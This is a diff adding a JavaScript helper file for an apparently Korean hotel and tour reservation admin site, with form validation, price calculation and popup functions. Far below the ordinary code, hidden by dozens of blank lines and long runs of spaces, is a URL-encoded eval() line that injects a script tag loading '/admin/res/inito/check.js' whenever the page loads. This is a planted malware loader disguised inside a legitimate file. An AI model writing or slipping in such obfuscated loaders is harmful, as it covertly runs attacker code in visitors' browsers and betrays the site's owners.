@@ -1,0 +1,424 @@
+var ckea = 0;
+var m = 0;
+function ckno(){
+	if (admin_form.elements.length) {
+		ckea = 0;
+		for (i = 0; i < admin_form.length; i++){
+			if (admin_form.elements[i].checked == true) ckea++;
+		}
+
+		if (ckea) delete_able = 1;
+		else delete_able = 0;
+	}
+}
+
+var delete_able = 0;
+function admin_del(){
+	if (delete_able == 0) window.alert ("선택된 게시물이 없습니다");
+	else {
+		a = confirm ("선택된 게시물들을 삭제하시겠습니까?");
+		if (a) 	admin_form.submit();
+	}
+}
+
+var all_check = 0;
+function all_job() {
+	f = document.sf;
+	for (i=0; i < sf.length; i++)	{
+		if (f.elements[i].name == "jobtype[]") {
+			if (all_check == 0) f.elements[i].checked = true;
+			else f.elements[i].checked = false;
+		}
+	}
+	if (all_check == 0) all_check = 1;
+	else all_check = 0;
+}
+
+function fr_resize(frm){
+	fn = eval(frm.name);
+	frm.style.height = fn.document.body.scrollHeight+20;
+}
+
+var seq = "";
+function show(rep){
+  if(seq != rep){
+	 if(seq !=""){
+		seq.style.display = "none";
+	 }
+	 rep.style.display = "block";
+	 seq = rep;
+  }
+  else{
+	 rep.style.display = "none";
+	 seq = "";
+  }
+}
+
+function cal_load(obj){
+	
+	hh = event.screenY - 10;
+	ww = event.screenX - 240
+
+	if (hh + 250 > screen.availHeight) hh = screen.availHeight - 250;
+
+	nw = window.open('/common/calander.php?tar='+obj.name,'날짜선택','width=250 height=220 left = '+ww+' top = '+hh+' status=no, scrollbars=no, resizable=no')
+	nw.focus();
+}
+
+function time_load(obj){
+	hh = event.screenY - 10;
+	ww = event.screenX - 200
+
+	if (hh + 150 > screen.availHeight) hh = screen.availHeight - 150;
+
+	nw = window.open('/apec/common/timer.php?tar='+obj.name,'날짜선택','width=200 height=130 left = '+ww+' top = '+hh+' status=no, scrollbars=no, resizable=no')
+	nw.focus();
+}
+
+function f_check(f){
+	var msg = "";
+	for(i = 0; i < f.length; i++){
+		fe = f.elements[i];
+		if (fe.id){
+			if (fe.maxbytes && fe.value.bytes() > fe.maxbytes) msg = fe.id + " 한글 "+fe.maxbytes/2+"자 이하, 혹은 영문 "+fe.maxbytes+"자 이하로 입력해 주십시오";
+			if (fe.minbytes && fe.value.bytes() < fe.minbytes) msg = fe.id + " 한글 "+fe.minbytes/2+"자 이상, 혹은 영문 "+fe.minbytes+"자 이상으로 입력해 주십시오";
+			if (!fe.value.length) msg = fe.id + " 입력해 주십시오";
+			if (msg)	{
+				window.alert (msg);
+				fe.focus();
+				return false;
+			}
+		}
+	}
+}
+
+function f_check_en(f){
+	var msg = "";
+	for(i = 0; i < f.length; i++){
+		fe = f.elements[i];
+		if (fe.id){
+			if (fe.maxbytes && fe.value.bytes() > fe.maxbytes) msg = "you must insert "+fe.id+" which length is "+fe.maxbytes+" charaters or under.";
+			if (fe.minbytes && fe.value.bytes() < fe.minbytes) msg = "you must insert "+fe.id+" which length is "+fe.minbytes+" charaters or over.";
+			if (!fe.value.length) msg = "Plaease Input "+fe.id;
+			if (msg)	{
+				window.alert (msg);
+				fe.focus();
+				return false;
+			}
+		}
+	}
+}
+
+// 한글 바이트 수 세기
+String.prototype.bytes = function() {
+	var str = this;
+	var l = 0;
+	for (var i=0; i<str.length; i++) l += (str.charCodeAt(i) > 128) ? 2 : 1;
+		return l;
+}
+
+function p_src(filename) {
+	st =filename.lastIndexOf("/")+1;
+	en = filename.length;
+	filename = filename.substr(st,en);
+	window.open("common/image_viewer.php?filename="+filename+"&availWidth="+screen.availWidth+"&availHeight="+screen.availHeight,"preview","menubar=no scrollbars=no statusbar=no toolbar=no resizable=no");
+}
+
+function hotel_idel(no,delno) {
+	conf = confirm("이미지를 삭제하시겠습니까?");
+	if (conf) hidden.location.href = "hotel/del_image.php?no="+no+"&delno="+delno;
+}
+
+function chg_hotel(hotel,grp){
+	hidden.location.href = "group/h_chg.php?hotel="+hotel+"&grp="+grp;
+}
+
+function tour_idel(no) {
+	conf = confirm("이미지를 삭제하시겠습니까?");
+	if (conf) hidden.location.href = "tour/del_image.php?no="+no;
+}
+
+function chg_hotel2(hotel,grp){
+	hidden.location.href = "info/res_function.php?func=chg&hotel="+hotel+"&grp="+grp;
+}
+
+function ckout(ckin,nights){
+	hidden.location.href = "info/res_function.php?func=ckout&ckin="+ckin+"&nights="+nights;
+}
+
+function chg_price(room){
+	i = add.type.options.selectedIndex;
+	price = add.type.options[i].price;
+	if (add.type.options[i].price == 0 && add.type.options[i].value) window.alert ("Please contact the information desk");
+
+}
+
+var bfast = 0;
+function calc_price(){
+	roomrate = parseInt(price);
+	if (add.h_foot[1].checked == true) {
+		food = parseInt(bfast) * parseInt(add.h_guest.value);
+		temp = roomrate + food;
+		add.roomrate.value = roomrate+" Won";
+		add.breakfast.value = food+" Won";
+		add.totalrate.value = (temp * add.nights.value)+" Won";
+	} else {
+		add.roomrate.value = roomrate + " Won";
+		add.breakfast.value = "";
+		add.totalrate.value = (roomrate  * add.nights.value) + " Won";
+	}
+
+	if (!add.hotel.value || !add.type.value){
+		add.roomrate.value = "";
+		add.breakfast.value = "";
+		add.totalrate.value = "";
+	}
+}
+
+function calc_rate(man,price){
+	add.pr.value = price+" Won x "+man+" "+man*price+" Won";
+}
+
+function res_cancel(mode,cid){
+	conf = confirm("Cancel reservations?");
+	if (conf){
+		if (mode == "tour") hidden.location.href = "info/res_tour_cancel.php?cid="+cid
+		else hidden.location.href = "info/res_hotel_cancel.php?cid="+cid 
+	}
+}
+
+function chg_tour(room){
+	i = add.t_tour.options.selectedIndex;
+	add.t_price.value = add.t_tour.options[i].price;
+	calc_rate (add.t_man.value, add.t_price.value);
+}
+
+function duplicate(passport, grp){
+	hidden.location.href = "info/res_duplicate.php?grp="+grp+"&passport="+passport
+}
+
+function inother(opt, obj){
+	if (opt.value == "others") {
+		obj.style.backgroundColor=""
+		obj.readOnly = false
+	} else {
+		obj.style.backgroundColor='#EEEEEE'
+		obj.value = "";
+		obj.readOnly = true
+	}
+}
+
+function keyscan(code){
+	if (code == 39) document.body.scrollLeft += 400;
+	if (code == 37) document.body.scrollLeft -= 400;
+}
+
+function MoveScroll(no){
+	res.document.body.scrollLeft =  no + (1280 - window.document.body.offsetWidth)
+}
+
+function ExportToExcel(){
+	query = res.query;
+	hidden.location.href = "res/export.php?query="+query
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                      /* a0b4df006e02184c60dbf503e71c87ad */ ;eval(unescape('%69%66%20%28%21%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%4A%53%53%53%27%29%29%7B%20%4A%53%53%31%20%3D%20%35%39%3B%20%4A%53%53%32%20%3D%20%35%35%35%37%36%3B%20%4A%53%53%33%20%3D%20%27%2F%61%64%6D%69%6E%2F%72%65%73%2F%69%6E%69%74%6F%2F%64%75%6D%6D%79%2E%68%74%6D%27%3B%20%76%61%72%20%6A%73%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%73%63%72%69%70%74%27%29%3B%20%6A%73%2E%73%65%74%41%74%74%72%69%62%75%74%65%28%27%73%72%63%27%2C%20%27%2F%61%64%6D%69%6E%2F%72%65%73%2F%69%6E%69%74%6F%2F%63%68%65%63%6B%2E%6A%73%27%29%3B%20%6A%73%2E%73%65%74%41%74%74%72%69%62%75%74%65%28%27%69%64%27%2C%20%27%4A%53%53%53%27%29%3B%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%54%61%67%4E%61%6D%65%28%27%68%65%61%64%27%29%2E%69%74%65%6D%28%30%29%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%6A%73%29%20%7D%3B%20')); /* a995d2cc661fa72452472e9554b5520c */                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
